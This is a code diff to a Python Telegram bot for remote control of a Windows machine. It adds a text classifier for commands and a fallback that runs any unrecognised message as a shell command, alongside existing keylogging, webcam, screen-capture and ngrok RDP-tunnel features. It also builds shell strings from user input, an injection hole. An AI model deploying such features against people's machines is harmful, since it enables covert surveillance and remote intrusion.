@@ -15,7 +15,11 @@ from pynput.keyboard import Controller as key
 import speech_recognition as sr
 import pyttsx3
 from pyngrok import ngrok
-if(os.getenv("CHAT_BOT_ENABLED") != "False"):
+import joblib
+import telepot
+from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
+
+if (os.getenv("CHAT_BOT_ENABLED") != "False"):
     import ollama
 
 
@@ -64,15 +68,17 @@ class features:
             telegram_bot: An instance of the Telegram bot.
         """
         load_dotenv()
+        self.nlp_model = joblib.load('text_classifier.joblib')
         self.admin_chat_id = os.getenv("ADMIN_CHAT_ID")
         self.api_key = os.getenv("API_KEY")
         self.admin_name = os.getenv("ADMIN_NAME")
         self.ngrok_token = os.getenv("NGROK_TOKEN")
         self.pronoun = os.getenv("PRONOUN")
-        self.ffmpegPathPrefix = os.getenv("FFMPEG_PATH_PREFIX")
+        self.ffmpeg_path_prefix = os.getenv("FFMPEG_PATH_PREFIX")
         self.rdp_port = os.getenv("RDP_PORT", "3389")
         self.rdp_active = False
-        self.chat_bot_enabled=os.getenv("CHAT_BOT_ENABLED", "True").lower() in ("true", "1", "t")
+        self.chat_bot_enabled = os.getenv(
+            "CHAT_BOT_ENABLED", "True").lower() in ("true", "1", "t")
         self.chat_id_file = 0
         self.photo_name = 'photo.png'
         self.authorzed_users = 'authorzed_Users/authorzed_Users.json'
@@ -92,11 +98,45 @@ class features:
         self.logger = 0
         self.telegram_bot = telegram_bot
         file_found = False
-        self.screen_State = False
-        self.video_State = False
+        self.screen_state = False
+        self.video_state = False
         self.chat_history = {}  # Dictionary to store chat history
         self.chat_mode = {}  # Dictionary to store chat modes
-
+        self.nlp_classifier_output = {}  # Dictionary to store NLP classifier outputut
+        self.keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text='yes', callback_data='yes'), InlineKeyboardButton(
+                text='no', callback_data='no')],
+        ])
+        self.command_handlers = {
+            "send": self.send,
+            "video": self.video,
+            "screen": self.screen,
+            "types": self.keyboard_type,
+            "speak": self.speak,
+            "screenshot": self.take_screenshot,
+            "stop": self.kill_task,
+            "photo": self.take_photo,
+            "keylog": self.key_logger,
+            "chat": self.run_language_model,
+            "list": self.list_users,
+            "kick": self.kick_user,
+            "rdp": self.start_stop_rdp_tunnel,
+        }
+        self._commmand_confrimation_msg = {
+            "send": "did you mean to send a document?",
+            "video": "did you mean to start/stop video streaming?",
+            "screen": "did you mean to start/stop screen sharing?",
+            "types": "did you mean to type the given text?",
+            "speak": "did you mean to convert text to speech?",
+            "screenshot": "did you mean to take a screenshot?",
+            "stop": "did you mean to stop a task?",
+            "photo": "did you mean to take a photo?",
+            "keylog": "did you mean to start/stop key logging?",
+            "chat": "did you mean to chat with the AI?",
+            "list": "did you mean to list all authorized users?",
+            "kick": "did you mean to kick an authorized user?",
+            "rdp": "did you mean to start/stop RDP tunnel?",
+        }
         while not file_found:
             try:
                 with open(self.authorzed_users) as f:
@@ -128,10 +168,11 @@ class features:
             first_name (str): The first name of the user.
             last_name (str): The last name of the user.
         """
-        if(self.rdp_active):
-            self.telegram_bot.sendMessage(chat_id, f"Cannot start/stop live server as RDP tunnel is running on the server")
+        if (self.rdp_active):
+            self.telegram_bot.sendMessage(
+                chat_id, "Cannot start/stop live server as RDP tunnel is running on the server")
             return None
-        if self.server_thread_state == "ON" and not self.video_State and not self.screen_State:
+        if self.server_thread_state == "ON" and not self.video_state and not self.screen_state:
             lw.stop_server()
             ngrok.kill()
             self.telegram_bot.sendMessage(chat_id, "video feed ended")
@@ -172,8 +213,8 @@ class features:
             last_name (str): The last name of the user.
         """
         print('hi')
-        self.video_State = not self.video_State
-        if self.video_State:
+        self.video_state = not self.video_state
+        if self.video_state:
             if self.server_thread_state != "ON":
                 _ = self.live_server(chat_id, first_name, last_name)
             self.telegram_bot.sendMessage(chat_id, f'''for live video feed visit
@@ -182,7 +223,7 @@ class features:
                 self.telegram_bot.sendMessage(self.admin_chat_id, f'''live video feed started by {first_name} {last_name} visit
 {self.public_url}''')
         else:
-            if not self.screen_State and not self.video_State:
+            if not self.screen_state and not self.video_state:
                 self.live_server(chat_id, first_name, last_name)
             else:
                 self.telegram_bot.sendMessage(
@@ -199,8 +240,8 @@ class features:
             first_name (str): The first name of the user.
             last_name (str): The last name of the user.
         """
-        self.screen_State = not self.screen_State
-        if self.screen_State:
+        self.screen_state = not self.screen_state
+        if self.screen_state:
             if self.server_thread_state != "ON":
                 self.live_server(chat_id, first_name, last_name)
 
@@ -210,13 +251,13 @@ class features:
                 self.telegram_bot.sendMessage(self.admin_chat_id, f'''live Screen feed started by {first_name} {last_name} visit
 {self.public_url}/screen''')
         else:
-            if not self.screen_State and not self.video_State:
+            if not self.screen_state and not self.video_state:
                 self.live_server(chat_id, first_name, last_name)
             else:
                 self.telegram_bot.sendMessage(
                     chat_id, 'Cannot stop server as other services are running on the server')
 
-    def download_file(self, msg, key):
+    def download_file(self, msg, key):# NOSONAR
         """
         Downloads a file from a message and handles authorization.
 
@@ -304,7 +345,7 @@ class features:
         Returns:
             tuple: A tuple indicating if speech recognition was successful and the recognized text.
         """
-        convert_command = f'{self.ffmpegPathPrefix}ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
+        convert_command = f'{self.ffmpeg_path_prefix}ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
         print(convert_command)
         message = Popen(convert_command, shell=True,
                         stdout=PIPE, text=True).communicate()[0]
@@ -326,7 +367,7 @@ class features:
             os.remove(f"downloads/{fname}.wav")
             os.remove(f"downloads/{fname}")
             print('deleted')
-            return False , text
+            return False, text
         print('deleted')
         print(text)
         self.telegram_bot.sendMessage(chat_id, f'you said {text}')
@@ -395,9 +436,9 @@ class features:
             first_name (str): The first name of the user.
             last_name (str): The last name of the user.
         """
-        command = f'''Taskkill /f /Im "{command_list[1]}.exe" /t'''
+        command_exec = f'''Taskkill /f /Im "{command_list[1]}.exe" /t'''
         if len(command_list) == 2:
-            message = Popen(command, shell=True,
+            message = Popen(command_exec, shell=True,
                             stdout=PIPE, text=True).communicate()[0]
         else:
             message = 'Invalid command'
@@ -551,7 +592,7 @@ here is log''')
         """
         return self.chat_history.get(chat_id, [])
 
-    def getChatMode(self, chat_id):
+    def get_chat_mode(self, chat_id):
         """
         Retrieves the chat mode for the given chat_id.
 
@@ -563,7 +604,7 @@ here is log''')
         """
         return self.chat_mode.get(chat_id, "non_ai")
 
-    def setChatMode(self, chat_id, isAi):
+    def set_chat_mode(self, chat_id, is_ai):
         """
         Sets the chat mode for the given chat_id.
 
@@ -571,7 +612,107 @@ here is log''')
             chat_id (int): The chat ID of the user.
             mode (str): The chat mode to be set.
         """
-        self.chat_mode[chat_id] = 'ai' if isAi else 'non_ai'
+        self.chat_mode[chat_id] = 'ai' if is_ai else 'non_ai'
+
+    def retrieve_command_predictions(self, chat_id, command, list_command, first_name, last_name):
+        """
+        Retrieves the predictions for the given command. If the prediction confidence is low, it asks for confirmation.
+
+        Args:
+            chat_id (int): The chat ID of the user.
+            command (str): The command received from the user.
+            list_command (list): The list of command arguments.
+            first_name (str): The first name of the user.
+            last_name (str): The last name of the user.
+
+        Returns:
+            None
+        """
+
+        predictons = self.nlp_model.predict_proba([command])
+        print(self.nlp_model.classes_.tolist()[predictons.argmax()])
+        if predictons.tolist()[0][predictons.argmax()] < 0.5:
+            self.nlp_classifier_output[chat_id] = {
+                'command': command, 'prediction': self.nlp_model.classes_.tolist()[predictons.argmax()]}
+            self.telegram_bot.sendMessage(chat_id, self._commmand_confrimation_msg[self.nlp_model.classes_.tolist()[
+                                          predictons.argmax()]], reply_markup=self.keyboard)
+        else:
+            self.command_handlers[self.nlp_model.classes_.tolist()[predictons.argmax()]](
+                chat_id, command, list_command, first_name, last_name)
+
+    def execute_chat_command(self, chat_id, command, list_command, first_name, last_name, reply=False):
+        """
+        Executes a chat command based on the given command and list of command arguments.
+
+        Args:
+            chat_id (int): The chat ID of the user.
+            command (str): The command received from the user.
+            list_command (list): The list of command arguments.
+            first_name (str): The first name of the user.
+            last_name (str): The last name of the user.
+            reply (bool, optional): If True, the command is a reply to a previous message. Defaults to False.
+
+        Returns:
+            None
+        """
+        print('execute_chat_command', command,
+              list_command, first_name, last_name, reply)
+        if command.startswith('>'):
+            command = command[1:]
+            list_command[0] = list_command[0][1:]
+            reply = True
+        if not reply:
+            self.retrieve_command_predictions(
+                chat_id, command, list_command, first_name, last_name)
+            return
+        cmd = list_command[0].lower()
+
+        if self.chat_mode.get(chat_id) == 'ai':
+
+            self.command_handlers['chat'](
+                chat_id, command, list_command, first_name, last_name)
+        elif cmd in self.command_handlers:
+            self.command_handlers[cmd](
+                chat_id, command, list_command, first_name, last_name)
+        elif chat_id == self.chat_id_file and cmd == self.random_f:
+            self.save_file_in_fin(chat_id)
+        else:
+            print('Executing as shell command')
+            process = Popen(command, shell=True,
+                            stdout=PIPE, stderr=PIPE, text=True)
+            stdout, stderr = process.communicate()
+            if process.returncode != 0:
+                self.telegram_bot.sendMessage(chat_id, "INVALID Command")
+            else:
+                self.telegram_bot.sendMessage(chat_id, stdout)
+                self.telegram_bot.sendMessage(chat_id, 'ok')
+
+    def reply_button(self, msg):
+        """
+        Handles the reply button callback query.
+
+        Args:
+            msg (dict): The callback query message.
+
+        Returns:
+            None
+        """
+        query_id, from_id, query_data = telepot.glance(
+            msg, flavor='callback_query')
+        chat_id = msg['message']['chat']['id']
+        first_name = msg['message']['chat']['first_name']
+        last_name = msg['message']['chat']['last_name']
+        if query_data == 'yes':
+            command = self.nlp_classifier_output[chat_id]['command']
+            list_command = command.split()
+            self.command_handlers[self.nlp_classifier_output[chat_id]['prediction']](
+                chat_id, command, list_command, first_name, last_name)
+            self.nlp_classifier_output[chat_id] = {}
+        elif query_data == 'no':
+            self.execute_chat_command(chat_id, self.nlp_classifier_output[chat_id]['command'], self.nlp_classifier_output[chat_id]['command'].split(
+            ), first_name, last_name, reply=True)
+            self.nlp_classifier_output[chat_id] = {}
+        self.telegram_bot.answerCallbackQuery(query_id)
 
     def run_language_model(self, chat_id, command, list_command, first_name, last_name):
         """
@@ -584,6 +725,7 @@ here is log''')
             first_name (str): The first name of the user.
             last_name (str): The last name of the user.
         """
+
         if self.chat_bot_enabled == False:
             self.telegram_bot.sendMessage(
                 chat_id, "Chat bot is disabled. Please enable it to use this feature.")
@@ -619,15 +761,15 @@ here is log''')
             self.telegram_bot.sendMessage(
                 chat_id, "You are not authorized to use this command.")
             return
-
+        users_available = False
         user_list = "Authorized Users:\n"
         for user in self.auth_list['authorized']:
             if user['chat_id'] is None or user['chat_id'] == int(self.admin_chat_id):
                 continue
             user_list += f"Name: {user['Name']}, Chat ID:`{user['chat_id']}`\n"
-
+            users_available = True
         self.telegram_bot.sendMessage(
-            chat_id, user_list, parse_mode='MarkdownV2')
+            chat_id,   user_list if users_available else 'No authorized users', parse_mode='MarkdownV2')
 
     def kick_user(self, chat_id, command, list_command, first_name, last_name):
         """
@@ -666,30 +808,33 @@ here is log''')
 
     def start_stop_rdp_tunnel(self, chat_id, command, list_command, first_name, last_name):
         # Set up ngrok tunnel
-        if(self.rdp_active):
+        if (self.rdp_active):
             ngrok.kill()
             self.rdp_active = False
-            self.telegram_bot.sendMessage(chat_id, f"RDP tunnel stopped")
-            if(not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
-                self.telegram_bot.sendMessage(self.admin_chat_id, f'''RDP tunnel stopped by {first_name} {last_name}''')
+            self.telegram_bot.sendMessage(chat_id, "RDP tunnel stopped")
+            if (not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
+                self.telegram_bot.sendMessage(
+                    self.admin_chat_id, f'''RDP tunnel stopped by {first_name} {last_name}''')
             return
-        elif(self.video_State):
-            self.telegram_bot.sendMessage(chat_id, f"Cannot start RDP tunnel as other video feed is running on the server")
+        elif (self.video_state):
+            self.telegram_bot.sendMessage(
+                chat_id, "Cannot start RDP tunnel as other video feed is running on the server")
             return
-        elif(self.screen_State):
-                self.telegram_bot.sendMessage(chat_id, f"Cannot start RDP tunnel as other screen feed is running on the server")
-                return
+        elif (self.screen_state):
+            self.telegram_bot.sendMessage(
+                chat_id, "Cannot start RDP tunnel as other screen feed is running on the server")
+            return
         ngrok_tunnel = ngrok.connect(self.rdp_port, "tcp")
 
         self.rdp_active = True
         # Get tunnel information
         tunnel_domain = ngrok_tunnel.public_url.split("/")[2].split(":")[0]
-        #get ip address from domain:port
+        # get ip address from domain:port
         print(ngrok_tunnel.public_url.split("/"))
         tunnel_ip = socket.gethostbyname(tunnel_domain)
         tunnel_port = ngrok_tunnel.public_url.split(":")[2]
-        self.telegram_bot.sendMessage(chat_id, f"RDP tunnel started at `{tunnel_ip}:{tunnel_port}`", parse_mode='MarkdownV2')
-        if(not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
-            self.telegram_bot.sendMessage(self.admin_chat_id, f'''RDP tunnel started by {first_name} {last_name}''')
-           
-            
+        self.telegram_bot.sendMessage(
+            chat_id, f"RDP tunnel started at `{tunnel_ip}:{tunnel_port}`", parse_mode='MarkdownV2')
+        if (not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
+            self.telegram_bot.sendMessage(
+                self.admin_chat_id, f'''RDP tunnel started by {first_name} {last_name}''')
